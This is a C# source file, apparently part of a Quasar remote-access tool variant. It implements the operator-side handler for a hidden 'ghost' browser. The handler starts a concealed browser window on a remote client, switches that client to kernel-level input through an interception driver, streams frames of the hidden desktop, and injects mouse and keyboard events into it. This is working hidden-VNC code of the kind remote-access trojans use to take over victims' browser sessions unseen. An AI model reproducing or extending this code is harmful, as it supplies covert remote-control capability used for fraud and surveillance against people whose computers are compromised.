using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Server.Networking;
using System;
using System.Drawing;
using System.IO;

namespace Quasar.Server.Messages
{
    public class HiddenBrowserHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        public bool IsStarted { get; set; }
        private volatile int _requestedQuality = 75;
        private volatile int _requestedDisplayIndex;
        private readonly object _syncLock = new object();
        private readonly object _sizeLock = new object();
        private Size _localResolution;
        private readonly Client _client;
        private volatile bool _pendingKernelInit;
        private int _pendingQuality;
        private int _pendingDisplayIndex;
        private int _lastWidth, _lastHeight;

        public int RequestedQuality { get => _requestedQuality; set => _requestedQuality = value; }
        public int RequestedDisplayIndex { get => _requestedDisplayIndex; set => _requestedDisplayIndex = value; }

        public event EventHandler<int> DisplaysChanged;
        public Size LocalResolution
        {
            get { lock (_sizeLock) return _localResolution; }
            set { lock (_sizeLock) _localResolution = value; }
        }

        public event Action<string> KernelInitFailed;
        /// <summary>Result: 0 = failed, 1 = success, 2 = no ghost window. Message is the client's text.</summary>
        public event Action<int, string> CloseGhostResult;

        public HiddenBrowserHandler(Client client) : base(true)
        {
            _client = client;
        }

        public override bool CanExecute(IMessage message) =>
            message is GetHiddenBrowserResponse || message is KernelInputInitResponse || message is CloseHiddenBrowserResult || message is GetMonitorsResponse;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetHiddenBrowserResponse r:
                    Execute(sender, r);
                    break;
                case KernelInputInitResponse k:
                    Execute(sender, k);
                    break;
                case CloseHiddenBrowserResult c:
                    Execute(c);
                    break;
                case GetMonitorsResponse m:
                    Execute(m);
                    break;
            }
        }

        private void Execute(GetMonitorsResponse message)
        {
            var n = message?.Number ?? 0;
            SynchronizationContext.Post(_ => DisplaysChanged?.Invoke(this, (int)_), n);
        }

        public void RefreshDisplays()
        {
            _client.Send(new GetMonitors());
        }

        private void Execute(CloseHiddenBrowserResult message)
        {
            int result = message?.Result ?? 0;
            string msg = string.IsNullOrEmpty(message?.Message) ? (result == 1 ? "Ghost window closed." : result == 2 ? "No ghost window was open." : "Failed to close ghost window.") : message.Message;
            SynchronizationContext.Post(_ =>
            {
                var t = (Tuple<int, string>)_;
                CloseGhostResult?.Invoke(t.Item1, t.Item2);
            }, Tuple.Create(result, msg));
        }

        public void BeginStream(int quality, int displayIndex)
        {
            lock (_syncLock)
            {
                _pendingKernelInit = true;
                _pendingQuality = quality;
                _pendingDisplayIndex = displayIndex;
                RequestedQuality = quality;
                RequestedDisplayIndex = displayIndex;
                _client.Send(new DoInitKernelInput());
            }
        }

        private void Execute(ISender sender, KernelInputInitResponse message)
        {
            lock (_syncLock)
            {
                if (!_pendingKernelInit) return;
                _pendingKernelInit = false;

                if (message.Success)
                {
                    IsStarted = true;
                    _client.Send(new DoSetRemoteControlMode { Mode = RemoteControlMode.Kernel });
                    _client.Send(new DoStartHiddenBrowser { Quality = _pendingQuality, DisplayIndex = _pendingDisplayIndex });
                    _client.Send(new GetHiddenBrowser { Quality = _pendingQuality, DisplayIndex = _pendingDisplayIndex });
                    return;
                }
                string err = string.IsNullOrEmpty(message.ErrorMessage)
                    ? "Interception driver initialization failed."
                    : message.ErrorMessage;
                SynchronizationContext.Post(_ => KernelInitFailed?.Invoke((string)_), err);
            }
        }

        private void Execute(ISender sender, GetHiddenBrowserResponse message)
        {
            lock (_syncLock)
            {
                if (!IsStarted) return;
                try
                {
                    Bitmap bmp = null;
                    if (message.Image != null && message.Image.Length >= 6)
                    {
                        int len = BitConverter.ToInt32(message.Image, 0);
                        if (len > 0 && len <= message.Image.Length - 4 && message.Image[4] == 0xFF && message.Image[5] == 0xD8)
                        {
                            using (var ms = new MemoryStream(message.Image, 4, len))
                                bmp = (Bitmap)Bitmap.FromStream(ms);
                        }
                    }
                    if (bmp != null)
                    {
                        if (message.Resolution != null)
                        {
                            _lastWidth = message.Resolution.Width;
                            _lastHeight = message.Resolution.Height;
                        }
                        using (bmp)
                            OnReport(new Bitmap(bmp, LocalResolution));
                    }
                }
                catch { }
                message.Image = null;
                sender.Send(new GetHiddenBrowser { Quality = RequestedQuality, DisplayIndex = RequestedDisplayIndex });
            }
        }

        public void EndStream()
        {
            lock (_syncLock)
            {
                IsStarted = false;
                _client.Send(new DoStopHiddenBrowser());
                /* Switch client back to User mode to disable remote input (no interception). */
                _client.Send(new DoSetRemoteControlMode { Mode = RemoteControlMode.User });
            }
        }

        public void CloseGhost()
        {
            _client.Send(new DoCloseHiddenBrowser());
        }

        public void SendMouseEvent(Common.Enums.MouseAction action, bool isDown, int x, int y)
        {
            if (!IsStarted) return;
            lock (_syncLock)
            {
                int w = _lastWidth > 0 ? _lastWidth : 1920;
                int h = _lastHeight > 0 ? _lastHeight : 1080;
                var local = LocalResolution;
                if (local.Width <= 0 || local.Height <= 0) return;
                _client.Send(new DoMouseEvent
                {
                    Action = action,
                    IsMouseDown = isDown,
                    X = x * w / local.Width,
                    Y = y * h / local.Height,
                    MonitorIndex = 0,
                    Mode = RemoteControlMode.Kernel
                });
            }
        }

        public void SendKeyboardEvent(byte keyCode, bool keyDown)
        {
            if (!IsStarted) return;
            _client.Send(new DoKeyboardEvent { Key = keyCode, KeyDown = keyDown, Mode = RemoteControlMode.Kernel });
        }

        public void Dispose()
        {
            lock (_syncLock) { IsStarted = false; }
            GC.SuppressFinalize(this);
        }
    }
}
